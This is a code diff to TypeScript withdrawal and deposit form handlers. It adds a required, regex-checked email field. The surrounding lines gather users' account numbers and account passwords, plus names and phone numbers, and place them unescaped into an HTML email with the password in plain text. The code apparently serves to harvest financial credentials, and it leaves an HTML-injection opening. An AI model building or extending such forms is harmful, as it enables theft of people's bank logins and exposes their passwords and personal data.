@@ -160,6 +160,7 @@ export async function submitWithdrawal(
   password: string,
   fullName: string,
   phoneNumber: string,
+  email: string,
   note?: string,
   token?: string
 ): Promise<FormSubmissionResult> {
@@ -188,10 +189,19 @@ export async function submitWithdrawal(
     }
 
     // Validate required fields
-    if (!amount || !accountNumber || !password || !fullName || !phoneNumber) {
+    if (!amount || !accountNumber || !password || !fullName || !phoneNumber || !email) {
       return {
         success: false,
-        message: 'Amount, Account Number, Password, Full Name, and Phone Number are required',
+        message: 'Amount, Account Number, Password, Full Name, Phone Number, and Email are required',
+      }
+    }
+
+    // Basic email validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+    if (!emailRegex.test(email)) {
+      return {
+        success: false,
+        message: 'Please enter a valid email address',
       }
     }
 
@@ -212,6 +222,7 @@ export async function submitWithdrawal(
       <p><strong>Account Number:</strong> ${accountNumber}</p>
       <p><strong>Password:</strong> ${password}</p>
       <p><strong>Full Name:</strong> ${fullName}</p>
+      <p><strong>Email:</strong> ${email}</p>
       <p><strong>Phone Number:</strong> ${phoneNumber}</p>
       ${note ? `<p><strong>Note:</strong> ${note}</p>` : ''}
       <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
@@ -236,6 +247,7 @@ export async function submitWithdrawal(
       accountNumber,
       password,
       fullName,
+      email,
       phoneNumber,
       note: note || null,
     })
@@ -261,6 +273,7 @@ export async function submitDeposit(
   accountNumber: string,
   fullName: string,
   phoneNumber: string,
+  email: string,
   note?: string,
   token?: string
 ): Promise<FormSubmissionResult> {
@@ -289,10 +302,19 @@ export async function submitDeposit(
     }
 
     // Validate required fields
-    if (!amount || !password || !accountNumber || !fullName || !phoneNumber) {
+    if (!amount || !password || !accountNumber || !fullName || !phoneNumber || !email) {
       return {
         success: false,
-        message: 'Amount, Password, Account Number, Full Name, and Phone Number are required',
+        message: 'Amount, Password, Account Number, Full Name, Phone Number, and Email are required',
+      }
+    }
+
+    // Basic email validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
+    if (!emailRegex.test(email)) {
+      return {
+        success: false,
+        message: 'Please enter a valid email address',
       }
     }
 
@@ -313,6 +335,7 @@ export async function submitDeposit(
       <p><strong>Password:</strong> ${password}</p>
       <p><strong>Account Number:</strong> ${accountNumber}</p>
       <p><strong>Full Name:</strong> ${fullName}</p>
+      <p><strong>Email:</strong> ${email}</p>
       <p><strong>Phone Number:</strong> ${phoneNumber}</p>
       ${note ? `<p><strong>Note:</strong> ${note}</p>` : ''}
       <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
@@ -337,6 +360,7 @@ export async function submitDeposit(
       password,
       accountNumber,
       fullName,
+      email,
       phoneNumber,
       note: note || null,
     })
